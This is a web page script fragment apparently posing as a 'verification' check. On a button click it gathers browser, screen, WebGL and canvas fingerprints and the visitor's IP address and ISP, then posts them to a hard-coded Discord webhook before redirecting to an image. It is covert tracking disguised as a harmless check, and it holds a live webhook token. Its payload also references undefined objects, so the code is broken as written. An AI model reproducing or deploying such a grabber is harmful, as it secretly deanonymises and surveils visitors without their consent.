  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1460849318389878894/ClbGdH42WUj200pA4iSDAFQYeSZfoR0UYe-WWONVp6VeHCZuUGmQGI86cD9leG5rDq_s";

    document.getElementById("verifyBtn").addEventListener("click", async () => {
      const container = document.getElementById("mainContainer");
      container.innerHTML = "<h1>Loadingâ€¦</h1>";

      await runVerification();

      // Redirect to your image after scan
      window.location.href = "https://raw.githubusercontent.com/ObiStonedKenobi/safe-or-not/main/Messenger_creation_304546BB-5FFB-4AFF-BC7A-453EA3D57CCE.jpeg";
    });

    async function runVerification() {
      const now = new Date();
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;

      const basic = {
        timestamp: now.toISOString(),
        localTime: now.toString(),
        timezone: tz,
        offsetMinutes: now.getTimezoneOffset(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        languages: navigator.languages,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack
      };

      const screenInfo = {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        pixelRatio: window.devicePixelRatio,
        windowWidth: window.innerWidth,
        windowHeight: window.innerHeight
      };

      const touch = {
        maxTouchPoints: navigator.maxTouchPoints,
        touchEvent: "ontouchstart" in window
      };

      function getWebGL() {
        const out = { supported: false, vendor: "unknown", renderer: "unknown" };
        try {
          const canvas = document.createElement("canvas");
          const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
          if (!gl) return out;
          out.supported = true;
          const debug = gl.getExtension("WEBGL_debug_renderer_info");
          if (debug) {
            out.vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
            out.renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
          }
        } catch {}
        return out;
      }

      function getCanvasFP() {
        try {
          const c = document.createElement("canvas");
          const ctx = c.getContext("2d");
          ctx.textBaseline = "top";
          ctx.font = "14px Arial";
          ctx.fillStyle = "#f60";
          ctx.fillRect(125, 1, 62, 20);
          ctx.fillStyle = "#069";
          ctx.fillText("fingerprint_test", 2, 15);
          return c.toDataURL();
        } catch {
          return "Unavailable";
        }
      }

      const webgl = getWebGL();
      const canvasFP = getCanvasFP();

      const network = await fetch("https://ipapi.co/json/")
        .then(r => r.json())
        .catch(() => ({ error: true }));

      const collected = {
        basic,
        screen: screenInfo,
        touch,
        webgl,
        canvasFingerprint: canvasFP,
        network
      };

      // Send summary embed
await fetch(WEBHOOK_URL, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    username: "Verification Scanner",
    content: "New verification result",
    embeds: [{
      title: "Scanned Environment",
      color: 3447003,
      fields: [
        { name: "Local Time", value: basic.localTime || "Unknown", inline: false },
        { name: "Timezone", value: basic.timezone || "Unknown", inline: true },
        { name: "Offset (Minutes)", value: basic.offsetMinutes || "Unknown", inline: true },
        { name: "Languages", value: basic.languages || "Unknown", inline: false },
        { name: "Platform", value: basic.platform || "Unknown", inline: true },
        { name: "CPU Threads", value: basic.hardwareConcurrency || "Unknown", inline: true },
        { name: "Device Memory", value: basic.deviceMemory || "Unknown", inline: true },
        { name: "Cookies Enabled", value: basic.cookieEnabled || "Unknown", inline: true },
        { name: "Do Not Track", value: basic.doNotTrack || "Unknown", inline: true },
        { name: "User Agent", value: basic.userAgent || "Unknown", inline: false },
        { name: "Screen Size", value: `${display.screenWidth}x${display.screenHeight}` || "Unknown", inline: true },
        { name: "Available Size", value: `${display.availWidth}x${display.availHeight}` || "Unknown", inline: true },
        { name: "Window Size", value: `${display.innerWidth}x${display.innerHeight}` || "Unknown", inline: true },
        { name: "Pixel Ratio", value: display.pixelRatio || "Unknown", inline: true },
        { name: "Touch Points", value: input.maxTouchPoints || "Unknown", inline: true },
        { name: "Touch Events", value: input.touchEventSupport || "Unknown", inline: true },
        { name: "WebGL Supported", value: graphics.webglSupported || "Unknown", inline: true },
        { name: "WebGL Vendor", value: graphics.webglVendor || "Unknown", inline: false },
        { name: "WebGL Renderer", value: graphics.webglRenderer || "Unknown", inline: false },
        { name: "IP Address", value: network.ip || "Unknown", inline: false },
        { name: "ISP / Org", value: network.org || "Unknown", inline: false },
        { name: "Lookup Status", value: network.lookupStatus || "Unknown", inline: true },
        { name: "Canvas Hash", value: integrity.canvasHashShort || "Unknown", inline: false },
        { name: "Environment Notes", value: integrity.environmentNotes || "None", inline: false },
      ]
    }]
  })
});
    }
